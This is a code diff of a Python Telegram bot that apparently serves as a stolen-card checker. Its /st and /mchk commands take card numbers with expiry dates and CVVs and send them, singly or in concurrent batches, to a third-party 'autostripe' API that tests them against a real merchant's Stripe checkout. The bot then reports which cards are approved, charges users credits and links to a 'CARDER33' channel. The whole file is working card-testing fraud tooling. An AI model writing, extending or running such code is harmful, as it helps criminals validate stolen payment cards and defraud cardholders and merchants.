@@ -1638,7 +1638,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-
 import re
 import logging
 import asyncio
@@ -1659,6 +1658,7 @@ user_cooldowns = {}
 
 CARD_PATTERN = re.compile(r"\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b")
 
+
 # -------------------- Cooldown --------------------
 async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
     last_run = user_cooldowns.get(user_id, 0)
@@ -1673,6 +1673,7 @@ async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int =
     user_cooldowns[user_id] = now
     return True
 
+
 # -------------------- Credits --------------------
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
@@ -1681,6 +1682,7 @@ async def consume_credit(user_id: int) -> bool:
         await update_user(user_id, credits=new_credits)
         return True
     return False
+
 
 # -------------------- Worker --------------------
 async def st_worker(update: Update, card: str, status_msg):
@@ -1709,21 +1711,17 @@ async def st_worker(update: Update, card: str, status_msg):
     card_type = bin_details.get("type", "N/A")
 
     # Clickable bullet + links
-    bullet_link = f"[{escape_markdown('⌇', version=2)}](https://t.me/CARDER33)"
+    bullet = "[⌇]"
+    bullet_link = f"[{escape_markdown(bullet, version=2)}](https://t.me/CARDER33)"
     developer = "[kคli liຖนxx](https://t.me/Kalinuxxx)"
     requested_by = f"[{escape_markdown(user.first_name, version=2)}](tg://user?id={user.id})"
 
-    # Escape dynamic fields
     response_text = escape_markdown(response_text, version=2)
-    brand = escape_markdown(brand, version=2)
-    issuer = escape_markdown(issuer, version=2)
-    country_name = escape_markdown(country_name, version=2)
-    card_type = escape_markdown(card_type, version=2)
 
-    # Build final result message
+    # Final result
     result_text = (
-        f"*◇━━ [ {escape_markdown(status, 2)}{status_emoji} ] ━━◇*\n"
-        f"{bullet_link} *Card:* `{escape_markdown(card, 2)}`\n"
+        f"*◇━━  {status}{status_emoji}  ━━◇*\n"
+        f"{bullet_link} *Card:* `{card}`\n"
         f"{bullet_link} *Gateway:* 𝗦𝘁𝗿𝗶𝗽𝗲 𝟏$ 💎\n"
         f"{bullet_link} *Response:* _{response_text}_\n"
         "――――――――――――――――\n"
@@ -1739,23 +1737,21 @@ async def st_worker(update: Update, card: str, status_msg):
 
     await status_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN_V2, disable_web_page_preview=True)
 
+
 # -------------------- Command --------------------
 async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
-    # Cooldown
     if not await enforce_cooldown(user_id, update):
         return
 
-    # Credits
     if not await consume_credit(user_id):
         msg = "❌ You have no credits left."
         return await update.message.reply_text(
             escape_markdown(msg, version=2), parse_mode=ParseMode.MARKDOWN_V2
         )
 
-    # Arguments
     if not context.args:
         usage_text = "🚫 Usage: /st `cc|mm|yy|cvv`"
         return await update.message.reply_text(
@@ -1773,19 +1769,20 @@ async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_input = match.group(0)
 
     # Normalize month/year
-    cc, mm, yy, cvv = card_input.split("|")
+    card, mm, yy, cvv = card_input.split("|")
     mm = mm.zfill(2)
     yy = yy[-2:] if len(yy) == 4 else yy
-    cc_normalized = f"{cc}|{mm}|{yy}|{cvv}"
+    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"
 
-    # Processing message
-    gateway_text = escape_markdown("Gateway ➜ #𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱", 2)
-    status_text = escape_markdown("Status ➜ Checking 🔎...", 2)
-    bullet_link = f"[{escape_markdown('⌇', 2)}](https://t.me/CARDER33)"
+    gateway_text = escape_markdown("Gateway ➜ #𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱", version=2)
+    status_text = escape_markdown("Status ➜ Checking 🔎...", version=2)
+
+    bullet = "[⌇]"
+    bullet_link = f"[{escape_markdown(bullet, version=2)}](https://t.me/CARDER33)"
 
     processing_text = (
         "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```" + "\n"
-        f"```{escape_markdown(cc_normalized, 2)}```\n\n"
+        f"```{cc_normalized}```" + "\n\n"
         f"{bullet_link} {gateway_text}\n"
         f"{bullet_link} {status_text}\n"
     )
@@ -1794,9 +1791,7 @@ async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
         processing_text, parse_mode=ParseMode.MARKDOWN_V2, disable_web_page_preview=True
     )
 
-    # Run worker in background
     asyncio.create_task(st_worker(update, cc_normalized, status_msg))
-
 
 
 
@@ -1815,73 +1810,79 @@ from telegram.ext import ContextTypes
 from telegram.error import TelegramError
 from db import get_user, update_user  # your async DB functions
 
-# API and concurrency settings
-API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
-CONCURRENCY = 3
-RATE_LIMIT_SECONDS = 5
-user_last_command_time = {}
+# ================== SETTINGS ==================
+API_URL = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
+CONCURRENCY_LIMIT = 3
+COOLDOWN_SECONDS = 5
+user_last_used = {}
 
-# --- Credit consume ---
-async def consume_credit(user_id: int) -> bool:
+# ================== UTILITIES ==================
+async def deduct_credit(user_id: int) -> bool:
+    """Decrease 1 credit if available."""
     try:
         user_data = await get_user(user_id)
         if user_data and user_data.get("credits", 0) > 0:
-            new_credits = user_data["credits"] - 1
-            await update_user(user_id, credits=new_credits)
+            await update_user(user_id, credits=user_data["credits"] - 1)
             return True
     except Exception as e:
-        print(f"[consume_credit] Error updating user {user_id}: {e}")
+        logging.error(f"[deduct_credit] DB error for {user_id}: {e}")
     return False
 
-# --- Extract cards from text ---
-def extract_cards_from_text(text: str) -> list[str]:
+def extract_card_patterns(text: str) -> list[str]:
+    """Extract cards from text in format cc|mm|yy|cvv."""
     return re.findall(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
 
-# --- Check single card via API ---
-async def check_card(session, card: str):
+# ================== API HANDLER ==================
+async def fetch_card_status(session, card: str):
+    """Call external API to check card status."""
     try:
-        async with session.get(API_URL_TEMPLATE + card, timeout=40) as resp:
+        async with session.get(API_URL + card, timeout=40) as resp:
             data = await resp.json()
-        status = data.get("status", "Unknown")
+
+        status = data.get("status", "Unknown").lower()
         response_text = data.get("response", "No response from API.")
 
-        if status.lower() == "approved":
-            emoji = "✅"
-        else:
-            emoji = "❌"
+        emoji = "✅" if status == "approved" else "❌"
 
         result_text = (
             f"<code>{card}</code>\n"
-            f"<b>Status ➳</b> {status} {emoji}\n"
-            f"<b>Response ➳</b> {response_text}"
+            f"⌇ <b>Status:</b> {status.upper()} {emoji}\n"
+            f"⌇ <b>Response:</b> {response_text}"
         )
-        return result_text, status.lower()
-    except (aiohttp.ClientError, asyncio.TimeoutError):
-        return f"<code>{card}</code>\n<b>Status ➳</b> Error ❌\n<b>Response ➳</b> Network error", "error"
-    except Exception as e:
-        return f"<code>{card}</code>\n<b>Status ➳</b> Error ❌\n<b>Response ➳</b> {e}", "error"
+        return result_text, status
 
-# --- Worker for mass check ---
-async def run_mass_check(msg, cards, user_id):
+    except (aiohttp.ClientError, asyncio.TimeoutError):
+        return (
+            f"<code>{card}</code>\n"
+            f"⌇ <b>Status:</b> ERROR ❌\n"
+            f"⌇ <b>Response:</b> Network error",
+            "error",
+        )
+    except Exception as e:
+        return (
+            f"<code>{card}</code>\n"
+            f"⌇ <b>Status:</b> ERROR ❌\n"
+            f"⌇ <b>Response:</b> {e}",
+            "error",
+        )
+
+# ================== MASS CHECKER ==================
+async def mass_checker(message, cards, user_id):
+    """Process multiple cards concurrently and update results in real-time."""
     total = len(cards)
     counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
     results = []
-    separator = "──────── ⸙ ─────────"
-    results_header = "𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸"
+    separator = "──────── ⸙ ────────"
     start_time = time.time()
 
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(CONCURRENCY)
+    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
 
     async with aiohttp.ClientSession() as session:
 
         async def worker(card):
             async with semaphore:
-                try:
-                    result_text, status = await check_card(session, card)
-                except Exception as e:
-                    result_text = f"❌ <code>{card}</code> - Error: {e}"
-                    status = "error"
+                result_text, status = await fetch_card_status(session, card)
 
                 counters["checked"] += 1
                 if status == "approved":
@@ -1893,91 +1894,99 @@ async def run_mass_check(msg, cards, user_id):
 
                 await queue.put(result_text)
 
-        # Start workers
         tasks = [asyncio.create_task(worker(c)) for c in cards]
 
-        async def consumer():
+        async def updater():
             while any(not t.done() for t in tasks) or not queue.empty():
                 try:
-                    result_text = await asyncio.wait_for(queue.get(), timeout=2)
+                    result = await asyncio.wait_for(queue.get(), timeout=2)
                 except asyncio.TimeoutError:
                     continue
 
-                results.append(result_text)
-
-                # Update message
+                results.append(result)
                 elapsed = round(time.time() - start_time, 2)
+
                 header = (
-                    f"✘ <b>Total</b> ↣ {total}\n"
-                    f"✘ <b>Checked</b> ↣ {counters['checked']}\n"
-                    f"✘ <b>Approved</b> ↣ {counters['approved']}\n"
-                    f"✘ <b>Declined</b> ↣ {counters['declined']}\n"
-                    f"✘ <b>Error</b> ↣ {counters['error']}\n"
-                    f"✘ <b>Time</b> ↣ {elapsed}s"
+                    f"✘ <b>Total:</b> {total}\n"
+                    f"✘ <b>Checked:</b> {counters['checked']}\n"
+                    f"✘ <b>Approved:</b> {counters['approved']}\n"
+                    f"✘ <b>Declined:</b> {counters['declined']}\n"
+                    f"✘ <b>Error:</b> {counters['error']}\n"
+                    f"✘ <b>Time:</b> {elapsed}s"
                 )
-                content = f"{header}\n\n<b>{results_header}</b>\n{separator}\n" + f"\n{separator}\n".join(results)
+
+                content = (
+                    f"{header}\n\n"
+                    f"<b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</b>\n"
+                    f"{separator}\n"
+                    + f"\n{separator}\n".join(results)
+                )
+
                 try:
-                    await msg.edit_text(content, parse_mode="HTML")
+                    await message.edit_text(content, parse_mode="HTML")
                 except TelegramError:
                     pass
 
                 await asyncio.sleep(0.5)
 
-        await asyncio.gather(consumer(), *tasks)
+        await asyncio.gather(updater(), *tasks)
 
-# --- /mchk Command ---
-async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ================== COMMAND HANDLER ==================
+async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler for /mchk command."""
     user_id = update.effective_user.id
-    current_time = time.time()
+    now = time.time()
 
     try:
-        # 5s cooldown check
-        if user_id in user_last_command_time:
-            elapsed = current_time - user_last_command_time[user_id]
-            if elapsed < RATE_LIMIT_SECONDS:
-                remaining = round(RATE_LIMIT_SECONDS - elapsed, 2)
+        # --- Cooldown ---
+        if user_id in user_last_used:
+            elapsed = now - user_last_used[user_id]
+            if elapsed < COOLDOWN_SECONDS:
+                remaining = round(COOLDOWN_SECONDS - elapsed, 2)
                 await update.message.reply_text(
-                    f"⚠️ Please wait <b>{remaining}</b> seconds before using /mchk again.",
-                    parse_mode="HTML"
+                    f"⚠️ Wait <b>{remaining}</b>s before using /mchk again.",
+                    parse_mode="HTML",
                 )
                 return
 
-        # Credit check
-        has_credit = await consume_credit(user_id)
-        if not has_credit:
+        # --- Credit check ---
+        if not await deduct_credit(user_id):
             await update.message.reply_text(
                 "❌ You don’t have enough credits to use <b>/mchk</b>.",
-                parse_mode="HTML"
+                parse_mode="HTML",
             )
             return
 
-        user_last_command_time[user_id] = current_time
+        user_last_used[user_id] = now
 
-        # Collect cards
+        # --- Card collection ---
         cards = []
         if context.args:
             cards = context.args
         elif update.message.reply_to_message and update.message.reply_to_message.text:
-            cards = extract_cards_from_text(update.message.reply_to_message.text)
+            cards = extract_card_patterns(update.message.reply_to_message.text)
 
         if not cards:
             await update.message.reply_text(
-                "❌ No cards found.\nUsage: <code>/mchk card1|mm|yy|cvv ...</code>\n"
+                "🚫 No cards found.\n"
+                "Usage: <code>/mchk card1|mm|yy|cvv ...</code>\n"
                 "Or reply to a message containing cards.",
-                parse_mode="HTML"
+                parse_mode="HTML",
             )
             return
 
-        # Send processing message
-        msg = await update.message.reply_text("⏳ <b>Processing your cards...</b>", parse_mode="HTML")
+        # --- Processing message ---
+        msg = await update.message.reply_text(
+            "⏳ <b>Checking your cards...</b>", parse_mode="HTML"
+        )
 
-        # Run background task
-        asyncio.create_task(run_mass_check(msg, cards, user_id))
+        # --- Start mass checker ---
+        asyncio.create_task(mass_checker(msg, cards, user_id))
 
     except Exception as e:
-        logging.error(f"[mchk_command] Error: {e}", exc_info=True)
+        logging.error(f"[mchk] Error: {e}", exc_info=True)
         try:
-            await update.message.reply_text("⚠️ An unexpected error occurred while processing your request.")
+            await update.message.reply_text("⚠️ Unexpected error while processing your request.")
         except Exception:
             pass
 
